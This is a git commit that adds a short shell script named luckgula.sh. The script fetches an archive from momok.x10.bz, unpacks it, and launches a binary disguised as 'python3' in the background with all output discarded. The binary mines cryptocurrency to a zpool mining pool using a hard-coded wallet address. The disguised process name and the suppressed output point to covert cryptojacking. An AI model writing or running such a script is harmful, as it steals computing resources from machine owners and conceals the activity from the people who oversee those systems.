1f560f7c211e09a39876d32c5f2a324a5403bfcd
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-06-20 17:32:03 +0700

    Create luckgula.sh

---
+++ luckgula.sh
@@ -0,0 +1,7 @@
+wget -O DOT momok.x10.bz/DOT-SRB.tar.gz
+
+tar -xvf DOT
+
+nohup ./dotsrb/python3 -a yespowersugar -o yespowerSUGAR.eu.mine.zpool.ca:6241 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt -p c=DGB > /dev/null 2>&1 &
+
+top
